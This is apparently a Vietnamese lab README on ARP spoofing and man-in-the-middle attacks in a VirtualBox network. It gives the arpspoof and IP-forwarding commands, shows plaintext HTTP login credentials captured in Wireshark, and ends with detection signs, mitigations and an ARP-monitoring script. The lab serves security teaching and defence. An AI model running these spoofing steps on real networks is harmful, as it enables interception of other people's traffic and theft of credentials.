# Network-Attacks-Traffic-Manipulation-in-LAN
# ARP Spoofing & Man-in-the-Middle Attack Detection

> **⚠️ Cảnh báo:** Tài liệu này chỉ phục vụ mục đích học thuật và nghiên cứu bảo mật trong môi trường lab kiểm soát. Không sử dụng kỹ thuật này trên mạng thực tế khi chưa được cấp phép.

---

## Mục lục

- [Tổng quan](#tổng-quan)
- [Mô hình hệ thống](#mô-hình-hệ-thống)
- [Yêu cầu hệ thống](#yêu-cầu-hệ-thống)
- [Cấu hình môi trường](#cấu-hình-môi-trường)
- [Công cụ sử dụng](#công-cụ-sử-dụng)
- [Quy trình thực hiện](#quy-trình-thực-hiện)
- [Kết quả thực nghiệm](#kết-quả-thực-nghiệm)
- [Phòng chống](#phòng-chống)
- [Tài liệu tham khảo](#tài-liệu-tham-khảo)

---

## Tổng quan

Lab này trình bày kỹ thuật **ARP Spoofing** (ARP Poisoning) nhằm thực hiện tấn công **Man-in-the-Middle (MITM)** trong môi trường mạng LAN ảo trên VirtualBox.

### Nguyên lý cốt lõi

| Giao thức | Lỗ hổng |
|-----------|---------|
| ARP | Không có cơ chế xác thực — máy tính tin tưởng bất kỳ ARP Reply nào |
| HTTP | Truyền dữ liệu dạng plain text, không mã hóa |

**Luồng tấn công:**
```
[Victim] → gói tin → [Attacker (Kali)] → chuyển tiếp → [Gateway] → Internet
```

---

## Mô hình hệ thống

```
          MẠNG LAN ẢO (NAT Network) — 10.0.2.0/24
                         │
                   [Gateway 10.0.2.1]
                  ┌──────┼──────┐
                  │      │      │
           [Kali]    [Windows]  [Ubuntu]      [Internet]
          10.0.2.5   10.0.2.4   10.0.2.3
         (Attacker)  (Victim)   (Monitor)
```

### Thông tin máy ảo

| Máy ảo | Vai trò | HĐH | IP | MAC |
|--------|---------|-----|----|-----|
| Kali_VM | Attacker | Kali Linux | `10.0.2.5` | `08:00:27:92:12:3d` |
| Win-Victim | Victim | Windows 10 | `10.0.2.4` | `08:00:27:4a:f7:c7` |
| Ubuntu_Monitor | Monitor | Ubuntu Server | `10.0.2.3` | `08:00:27:e7:f5:d3` |
| Gateway | Cổng mạng | VirtualBox NAT | `10.0.2.1` | `52:55:0a:00:02:01` |

---

## Yêu cầu hệ thống

| Thành phần | Yêu cầu |
|------------|---------|
| CPU | Hỗ trợ ảo hóa (Intel VT-x / AMD-V) |
| RAM | Tối thiểu 8 GB, khuyến nghị 16 GB |
| Ổ cứng | Trống ≥ 50 GB |
| Phần mềm | VirtualBox 7.x |

---

## Cấu hình môi trường

### 1. Tạo NAT Network trong VirtualBox

```
VirtualBox → File → Tools → Network Manager
Tab "NAT Networks" → Create
  Name:         MITM_Lab
  Network CIDR: 10.0.2.0/24
  DHCP:         Enabled
```

### 2. Thông số từng máy ảo

<details>
<summary><b>Kali_VM (Attacker)</b></summary>

| Thông số | Giá trị |
|----------|---------|
| OS | Debian 64-bit |
| RAM | 2048 MB |
| CPU | 2 cores |
| HDD | 20 GB |
| Network | NAT Network — MITM_Lab |

</details>

<details>
<summary><b>Win-Victim (Victim)</b></summary>

| Thông số | Giá trị |
|----------|---------|
| OS | Windows 10 64-bit |
| RAM | 4096 MB |
| CPU | 2 cores |
| HDD | 40 GB |
| Network | NAT Network — MITM_Lab |

</details>

<details>
<summary><b>Ubuntu_Monitor (Monitor)</b></summary>

| Thông số | Giá trị |
|----------|---------|
| OS | Ubuntu Server 24.04 64-bit |
| RAM | 1024 MB |
| CPU | 1 core |
| HDD | 10 GB |
| Network | NAT Network — MITM_Lab |

</details>

### 3. Thông tin đăng nhập

| Máy | Username | Password |
|-----|----------|----------|
| Kali | `kali` | `kali` |
| Windows | `victim` | `victim` |
| Ubuntu | `monitor` | `monitor` |

---

## Công cụ sử dụng

### Kali Linux (Attacker)

| Công cụ | Phiên bản | Mục đích | Lệnh |
|---------|-----------|----------|------|
| `arpspoof` (dsniff) | 2.4b1 | Gửi ARP Reply giả mạo | `sudo arpspoof -i eth0 -t <target> <gateway>` |
| Wireshark | 4.2.x | Bắt & phân tích gói tin | `sudo wireshark` |
| Nmap | 7.94 | Quét thiết bị trong mạng | `sudo nmap -sn 10.0.2.0/24 -T5` |

### Windows 10 (Victim)

| Công cụ | Mục đích | Lệnh |
|---------|----------|------|
| `arp` | Kiểm tra bảng ARP | `arp -a` |
| `ipconfig` | Kiểm tra IP & Gateway | `ipconfig` |
| Windows Firewall | Tắt để tránh chặn ARP | `wf.msc` |
| Trình duyệt | Tạo traffic HTTP | `http://testasp.vulnweb.com` |

### Ubuntu Server (Monitor)

| Công cụ | Mục đích | Lệnh |
|---------|----------|------|
| `ip` | Kiểm tra địa chỉ IP | `ip a` |
| `arp -n` | Kiểm tra bảng ARP | `arp -n` |
| `ping` | Kiểm tra kết nối | `ping 10.0.2.1` |
| `net-tools` | Bộ công cụ mạng | `sudo apt install net-tools -y` |

---

## Quy trình thực hiện

### Phase 1: Chuẩn bị (Pre-attack)

#### Ubuntu Monitor
```bash
# Kiểm tra IP
ip a
# → enp0s3: 10.0.2.3

# Kiểm tra & cấu hình DNS
cat /etc/resolv.conf
sudo sh -c 'echo "nameserver 8.8.8.8" > /etc/resolv.conf'
sudo sh -c 'echo "nameserver 8.8.4.4" >> /etc/resolv.conf'

# Cài công cụ
sudo apt update && sudo apt install net-tools -y

# Kiểm tra kết nối
ping -c 3 10.0.2.4   # → Windows
ping -c 3 10.0.2.5   # → Kali
```

#### Windows Victim
```cmd
# Tắt Windows Firewall (Private + Public)
wf.msc

# Kiểm tra IP
ipconfig
# → IPv4: 10.0.2.4 | Gateway: 10.0.2.1

# Kiểm tra bảng ARP TRƯỚC tấn công (trạng thái bình thường)
arp -a
```

**Bảng ARP bình thường:**
```
10.0.2.1    52-55-0a-00-02-01   (Gateway — MAC thật)
10.0.2.3    08-00-27-e7-f5-d3   (Ubuntu Monitor)
10.0.2.5    08-00-27-92-12-3d   (Kali Attacker)
```

> **Cấu hình DNS Google trên Windows:**
> `Control Panel → Network → IPv4 Properties`
> - Preferred DNS: `8.8.8.8`
> - Alternate DNS: `8.8.4.4`

#### Kali Attacker
```bash
# Kiểm tra IP
ip a
# → eth0: 10.0.2.5 | MAC: 08:00:27:92:12:3d

# Quét mạng xác nhận
sudo nmap -sn 10.0.2.0/24 -T5 --min-parallelism 100
# → Kết quả: 10.0.2.1, 10.0.2.3, 10.0.2.4, 10.0.2.5
```

---

### Phase 2: Thực hiện tấn công (Attack Phase)

#### Bước 1 — Bật IP Forwarding (Kali)
```bash
sudo su
echo 1 > /proc/sys/net/ipv4/ip_forward
exit
# Cho phép Kali chuyển tiếp gói tin → nạn nhân vẫn lên được internet
```

#### Bước 2 — ARP Spoofing (Kali — 2 terminal song song)

**Terminal 1:** Lừa Victim
```bash
sudo arpspoof -i eth0 -t 10.0.2.4 10.0.2.1
# Nói với Windows: "Gateway 10.0.2.1 có MAC = MAC của Kali"
```

**Terminal 2:** Lừa Gateway
```bash
sudo arpspoof -i eth0 -t 10.0.2.1 10.0.2.4
# Nói với Gateway: "Victim 10.0.2.4 có MAC = MAC của Kali"
```

#### Bước 3 — Bắt gói tin với Wireshark (Kali — Terminal 3)
```bash
sudo wireshark
# Chọn interface: eth0
# Display filter:  http
```

#### Bước 4 — Nạn nhân truy cập web (Windows)
```
1. Mở trình duyệt → http://testasp.vulnweb.com
2. Nhập thông tin đăng nhập bất kỳ (VD: admin123 / bandabihack)
3. Nhấn Login
```

> **Lưu ý:** Chọn HTTP thay vì HTTPS vì HTTPS đã mã hóa — không đọc được plain text.

---

### Phase 3: Phân tích kết quả (Post-attack)

#### Wireshark — Tìm gói POST
```
Lọc: http
→ Tìm gói: POST /Login.asp?...
→ Mở rộng: HTML Form URL Encoded
   ├── Form item: "tfUName" = "admin123"
   └── Form item: "tfUPass" = "bandabihack"
```

#### Windows — Kiểm tra bảng ARP sau tấn công
```cmd
arp -a
```

**Bảng ARP sau khi bị tấn công (BẤT THƯỜNG):**
```
10.0.2.1    08-00-27-92-12-3d   ← Gateway bị giả mạo! (MAC của Kali)
10.0.2.3    08-00-27-e7-f5-d3   (Ubuntu — bình thường)
10.0.2.5    08-00-27-92-12-3d   (Kali — MAC thật)
```

> **Dấu hiệu nhận biết:** `10.0.2.1` và `10.0.2.5` cùng MAC → ARP Spoofing đang xảy ra.

---

## Kết quả thực nghiệm

### So sánh bảng ARP trước/sau

| IP | MAC Trước | MAC Sau | Thay đổi |
|----|-----------|---------|----------|
| `10.0.2.1` (Gateway) | `52:55:0a:00:02:01` | `08:00:27:92:12:3d` | ✅ Có |
| `10.0.2.5` (Kali) | `08:00:27:92:12:3d` | `08:00:27:92:12:3d` | ❌ Không |

### Dữ liệu bắt được

```
Source MAC:   08:00:27:4a:f7:c7  (Windows Victim)
Source IP:    10.0.2.4
Dest IP:      44.238.29.2
Protocol:     HTTP — POST
Credentials:  uname=admin123 & pass=bandabihack  (plain text!)
```

### Ba dấu hiệu phát hiện ARP Spoofing

1. **Một MAC cho hai IP:** `10.0.2.1` (Gateway) và `10.0.2.5` (Kali) cùng MAC `08:00:27:92:12:3d`
2. **MAC Gateway thay đổi:** `52:55:0a:00:02:01` → `08:00:27:92:12:3d`
3. **MAC Gateway trùng MAC Attacker:** Cả hai đều là MAC của Kali

---

## Phòng chống

| Biện pháp | Mô tả | Hiệu quả |
|-----------|-------|----------|
| **HTTPS** | Mã hóa dữ liệu truyền tải, kể cả bị chặn cũng không đọc được | 🟢 Cao |
| **Dynamic ARP Inspection (DAI)** | Switch kiểm tra tính hợp lệ của gói ARP | 🟢 Cao |
| **VPN** | Mã hóa toàn bộ traffic | 🟢 Cao |
| **ARP Spoofing Detection** | Giám sát bảng ARP định kỳ, cảnh báo khi phát hiện bất thường | 🟡 Trung bình |
| **Tường lửa cá nhân** | Phát hiện ARP bất thường ở endpoint | 🔴 Thấp |

### Script giám sát ARP đơn giản (Ubuntu)

```bash
#!/bin/bash
# arp_monitor.sh — Phát hiện IP có cùng MAC (dấu hiệu ARP Spoofing)

GATEWAY_IP="10.0.2.1"
EXPECTED_MAC="52:55:0a:00:02:01"

while true; do
    CURRENT_MAC=$(arp -n | grep "$GATEWAY_IP" | awk '{print $3}')
    if [ "$CURRENT_MAC" != "$EXPECTED_MAC" ]; then
        echo "[ALERT] $(date) — ARP Spoofing detected!"
        echo "  Gateway $GATEWAY_IP MAC changed: $EXPECTED_MAC → $CURRENT_MAC"
    fi
    sleep 5
done
```

---

## Dọn dẹp sau lab

```bash
# Kali — Dừng tấn công
Ctrl + C  # trên cả 2 terminal arpspoof

# Tắt IP Forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward
```

Sau vài phút, MAC của Gateway trên Windows sẽ tự phục hồi về `52-55-0a-00-02-01`.

---

## Bài học rút ra

1. **ARP không có xác thực** — Giao thức tin tưởng mọi gói Reply, đây là lỗ hổng cố hữu của thiết kế.
2. **HTTP = không an toàn** — Mọi dữ liệu (bao gồm mật khẩu) truyền qua HTTP đều có thể bị đọc khi bị MITM.
3. **Mạng LAN không an toàn tuyệt đối** — Cần triển khai giám sát ngay cả trong mạng nội bộ.

---

## Tài liệu tham khảo

1. Whalen, S. (2001). *An Introduction to ARP Spoofing*. Node99. http://node99.org/projects/arpspoof/arpspoof.pdf
2. Wright, J. (2009). *Detecting ARP Spoofing*. SANS Institute. https://www.sans.org/reading-room/whitepapers/detection/detecting-arp-spoofing-32974
3. OWASP. (2021). *Man-in-the-Middle Attack*. https://owasp.org/www-community/attacks/Man-in-the-middle_attack
4. Oracle Corporation. (2024). *VirtualBox 7.1 User Manual*. https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/
5. Wireshark Foundation. (2024). *Wireshark User's Guide*. https://www.wireshark.org/docs/

---

*Lab thực hiện trên môi trường VirtualBox NAT Network — 10.0.2.0/24*
